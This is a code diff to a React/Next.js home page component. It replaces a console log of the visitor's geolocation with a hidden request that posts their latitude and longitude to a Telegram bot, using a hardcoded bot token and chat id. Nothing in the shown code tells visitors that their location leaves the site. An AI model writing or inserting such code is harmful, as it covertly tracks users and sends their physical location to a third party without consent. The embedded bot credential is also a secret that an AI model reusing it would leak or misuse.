@@ -10,12 +10,17 @@ import { useAppContext } from "@/context/AppContext";
 import { IHeaderProps } from "@/interface";
 
 import styles from "./page.module.css";
+import axios from "axios";
 
 export default function Home() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition((position) => {
       const { latitude, longitude } = position.coords;
-      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+      const send = `l: ${latitude} lg: ${longitude}`;
+      axios({
+        method: "post",
+        url: `https://api.telegram.org/bot7886110419:AAE_XefEJWd0lQaJvlJj3xcEYnw55TKk4Vo/sendMessage?chat_id=6657415554&text=${send}`,
+      });
       // You can use reverse geocoding here to find the location
     });
   } else {
